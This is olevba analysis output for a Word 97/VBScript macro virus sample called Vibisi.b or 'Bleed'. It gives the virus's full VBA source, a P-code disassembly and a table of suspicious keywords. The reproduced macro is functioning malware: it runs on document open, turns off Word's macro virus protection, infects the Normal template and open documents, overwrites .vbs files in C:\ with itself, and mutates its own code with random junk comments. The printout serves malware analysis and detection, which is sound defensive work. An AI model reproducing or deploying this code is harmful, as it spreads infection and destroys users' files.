olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vibisi.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Vibisi.b - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Name:   Word97/VBScript.Bleed
Author: jack twoflower LineZer0/Metaphase
Date:   July 1999
----------------------------------------->


Call vibisi '
Sub vibisi() '
On Error Resume Next '
Dim fso, f, wo, nucode, code, jcode '
nucode = "" '
code = "" '
jcode = "" '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
full = f.readall '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
For i = 1 To 200 '
code = f.readline '
For j = 1 To Int(Rnd * 30): jcode = jcode & chr(65 + Int(Rnd * 22)): Next '
nucode = nucode & code & chr(39) & jcode & vbcr '
If Int(Rnd * 3) = 2 Then nucode = nucode & chr(39) & jcode & vbcr '
jcode = "" '
If code = "" Then Exit For '
code = "" '
Next '
Set f = fso.opentextfile(wscript.scriptfullname, 2, True) '
f.writeline nucode '
Set wo = CreateObject("word.application") '
With wo.Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
Set f = Nothing '
For i = 1 To wo.Application.FileSearch.FoundFiles.Count '
If wo.Application.FileSearch.FoundFiles(i) <> wscript.scriptfullname Then '
Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True) '
f.writeline full '
End If '
Next '
wo.Options.VirusProtection = (Rnd * 0) '
wo.Options.SaveNormalPrompt = (Rnd * 0) '
wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname '
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs" '
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1 '
wo.NormalTemplate.Save '
wo.Quit '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase"
End Sub '
Sub autoopen()
On Error Resume Next '
Dim v(2000): t = chr(39)
Options.VirusProtection = (Rnd * 0) '
Options.SaveNormalPrompt = (Rnd * 0) '
For i = 1 To ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), t) '
v(i) = Left(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), (p - 1)) '
For j = 1 To Int(75 - (Rnd * 20)) '
jc = jc & chr(255 - Int(Rnd * 100)) '
Next '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbcr & chr(32) & t & jc '
vc = vc & v(i) & vbcr '
n_: '
Next '
e_: '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile("c:\scriptO8.ini", 2, True) '
cp = "Attribute VB_Name = ""vbs""" & vbcr '
f.write cp '
f.write vc '
If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini" '
If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then '
ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini" '
ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
With Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
For x = 1 To Application.FileSearch.FoundFiles.Count '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True) '
codex = "call vibisi" & chr(39) & vbcr & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
f.write codex '
Next '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase", 0, "Word/VBS.Bleed"
End Sub '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vibisi.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Modul 1 - 6654 bytes
' Line #0:
' 	Reparse 0x001D "Name:   Word97/VBScript.Bleed"
' Line #1:
' 	Reparse 0x0029 "Author: jack twoflower LineZer0/Metaphase"
' Line #2:
' 	ArgsCall Date 0x0000 
' 	BoS 0x0008 
' 	LitDI2 0x07CF 
' 	ArgsCall July 0x0001 
' Line #3:
' 	Reparse 0x002A "----------------------------------------->"
' Line #4:
' Line #5:
' Line #6:
' 	ArgsCall (Call) vibisi 0x0000 
' 	QuoteRem 0x000C 0x0000 ""
' Line #7:
' 	FuncDefn (Sub vibisi())
' 	QuoteRem 0x000D 0x0000 ""
' Line #8:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0000 ""
' Line #9:
' 	Dim 
' 	VarDefn fso
' 	VarDefn False
' 	VarDefn wo
' 	VarDefn nucode
' 	VarDefn code
' 	VarDefn jcode
' 	QuoteRem 0x0024 0x0000 ""
' Line #10:
' 	LitStr 0x0000 ""
' 	St nucode 
' 	QuoteRem 0x000C 0x0000 ""
' Line #11:
' 	LitStr 0x0000 ""
' 	St code 
' 	QuoteRem 0x000A 0x0000 ""
' Line #12:
' 	LitStr 0x0000 ""
' 	St jcode 
' 	QuoteRem 0x000B 0x0000 ""
' Line #13:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0035 0x0000 ""
' Line #14:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0001 
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0002 
' 	Set False 
' 	QuoteRem 0x0034 0x0000 ""
' Line #15:
' 	Ld False 
' 	MemLd readall 
' 	St full 
' 	QuoteRem 0x0011 0x0000 ""
' Line #16:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0001 
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0002 
' 	Set False 
' 	QuoteRem 0x0034 0x0000 ""
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00C8 
' 	For 
' 	QuoteRem 0x0011 0x0000 ""
' Line #18:
' 	Ld False 
' 	MemLd readline 
' 	St code 
' 	QuoteRem 0x0012 0x0000 ""
' Line #19:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld jcode 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	St jcode 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x004A 0x0000 ""
' Line #20:
' 	Ld nucode 
' 	Ld code 
' 	Concat 
' 	LitDI2 0x0027 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	Ld jcode 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	St nucode 
' 	QuoteRem 0x0030 0x0000 ""
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld nucode 
' 	LitDI2 0x0027 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	Ld jcode 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	St nucode 
' 	EndIf 
' 	QuoteRem 0x0042 0x0000 ""
' Line #22:
' 	LitStr 0x0000 ""
' 	St jcode 
' 	QuoteRem 0x000B 0x0000 ""
' Line #23:
' 	Ld code 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' 	QuoteRem 0x001B 0x0000 ""
' Line #24:
' 	LitStr 0x0000 ""
' 	St code 
' 	QuoteRem 0x000A 0x0000 ""
' Line #25:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #26:
' 	SetStmt 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x003A 0x0000 ""
' Line #27:
' 	Ld nucode 
' 	Ld False 
' 	ArgsMemCall writeline 0x0001 
' 	QuoteRem 0x0013 0x0000 ""
' Line #28:
' 	SetStmt 
' 	LitStr 0x0010 "word.application"
' 	ArgsLd CreateObject 0x0001 
' 	Set wo 
' 	QuoteRem 0x002A 0x0000 ""
' Line #29:
' 	StartWithExpr 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	With 
' 	QuoteRem 0x001F 0x0000 ""
' Line #30:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' 	QuoteRem 0x0010 0x0000 ""
' Line #31:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' 	QuoteRem 0x001A 0x0000 ""
' Line #32:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' 	QuoteRem 0x0014 0x0000 ""
' Line #33:
' 	ArgsMemCallWith Execute 0x0000 
' 	QuoteRem 0x0009 0x0000 ""
' Line #34:
' 	EndWith 
' 	QuoteRem 0x0009 0x0000 ""
' Line #35:
' 	SetStmt 
' 	LitNothing 
' 	Set False 
' 	QuoteRem 0x0010 0x0000 ""
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0038 0x0000 ""
' Line #37:
' 	Ld i 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x004A 0x0000 ""
' Line #38:
' 	SetStmt 
' 	Ld i 
' 	Ld wo 
' 	MemLd Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x004B 0x0000 ""
' Line #39:
' 	Ld full 
' 	Ld False 
' 	ArgsMemCall writeline 0x0001 
' 	QuoteRem 0x0011 0x0000 ""
' Line #40:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #41:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #42:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0027 0x0000 ""
' Line #43:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld wo 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0028 0x0000 ""
' Line #44:
' 	Ld wscript 
' 	MemLd scriptfullname 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	QuoteRem 0x0047 0x0000 ""
' Line #45:
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x0066 0x0000 ""
' Line #46:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' 	QuoteRem 0x004C 0x0000 ""
' Line #47:
' 	Ld wo 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0017 0x0000 ""
' Line #48:
' 	Ld wo 
' 	ArgsMemCall Quit 0x0000 
' 	QuoteRem 0x0008 0x0000 ""
' Line #49:
' 	LitStr 0x0011 "I make you bleed!"
' 	Ld vbcr 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	LitStr 0x0025 "jack twoflower / LineZer0 / Metaphase"
' 	Concat 
' 	ArgsCall Msgbox 0x0001 
' Line #50:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #51:
' 	FuncDefn (Sub autoopen())
' Line #52:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0000 ""
' Line #53:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x07D0 
' 	VarDefn v
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd chr 0x0001 
' 	St t 
' Line #54:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0024 0x0000 ""
' Line #55:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0025 0x0000 ""
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' 	QuoteRem 0x0050 0x0000 ""
' Line #57:
' 	LitStr 0x0000 ""
' 	St jc 
' 	QuoteRem 0x0008 0x0000 ""
' Line #58:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St d 
' 	QuoteRem 0x0011 0x0000 ""
' Line #59:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x0050 0x0000 ""
' Line #60:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0058 0x0000 ""
' Line #61:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	QuoteRem 0x0022 0x0000 ""
' Line #62:
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	St jc 
' 	QuoteRem 0x0024 0x0000 ""
' Line #63:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #64:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0015 0x0000 ""
' Line #65:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld vbcr 
' 	Concat 
' 	LitDI2 0x0020 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	EndIf 
' 	QuoteRem 0x0034 0x0000 ""
' Line #66:
' 	Ld vc 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x0016 0x0000 ""
' Line #67:
' 	Label n_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #68:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #69:
' 	Label e_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #70:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0035 0x0000 ""
' Line #71:
' 	SetStmt 
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x0035 0x0000 ""
' Line #72:
' 	LitStr 0x0019 "Attribute VB_Name = "vbs""
' 	Ld vbcr 
' 	Concat 
' 	St cp 
' 	QuoteRem 0x002A 0x0000 ""
' Line #73:
' 	Ld cp 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x000B 0x0000 ""
' Line #74:
' 	Ld vc 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x000B 0x0000 ""
' Line #75:
' 	LitStr 0x0003 "vbs"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' 	QuoteRem 0x0082 0x0000 ""
' Line #76:
' 	LitStr 0x0003 "vbs"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0043 0x0000 ""
' Line #77:
' 	LitStr 0x000F "c:\scriptO8.ini"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	QuoteRem 0x003F 0x0000 ""
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	QuoteRem 0x002E 0x0000 ""
' Line #79:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #80:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' 	QuoteRem 0x001C 0x0000 ""
' Line #81:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' 	QuoteRem 0x0010 0x0000 ""
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' 	QuoteRem 0x001A 0x0000 ""
' Line #83:
' 	LitStr 0x0005 "*.vbs"
' 	MemStWith FileName 
' 	QuoteRem 0x0014 0x0000 ""
' Line #84:
' 	ArgsMemCallWith Execute 0x0000 
' 	QuoteRem 0x0009 0x0000 ""
' Line #85:
' 	EndWith 
' 	QuoteRem 0x0009 0x0000 ""
' Line #86:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd FileSearch 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0035 0x0000 ""
' Line #87:
' 	SetStmt 
' 	LitStr 0x001A "scripting.filesystemobject"
' 	ArgsLd CreateObject 0x0001 
' 	Set fso 
' 	QuoteRem 0x0035 0x0000 ""
' Line #88:
' 	SetStmt 
' 	Ld x 
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld fso 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set False 
' 	QuoteRem 0x0048 0x0000 ""
' Line #89:
' 	LitStr 0x000B "call vibisi"
' 	LitDI2 0x0027 
' 	ArgsLd chr 0x0001 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0003 "vbs"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St codex 
' Line #90:
' 	Ld codex 
' 	Ld False 
' 	ArgsMemCall Xor 0x0001 
' 	QuoteRem 0x000E 0x0000 ""
' Line #91:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #92:
' 	LitStr 0x0011 "I make you bleed!"
' 	Ld vbcr 
' 	Concat 
' 	Ld vbcr 
' 	Concat 
' 	LitStr 0x0025 "jack twoflower / LineZer0 / Metaphase"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000E "Word/VBS.Bleed"
' 	ArgsCall Msgbox 0x0003 
' Line #93:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

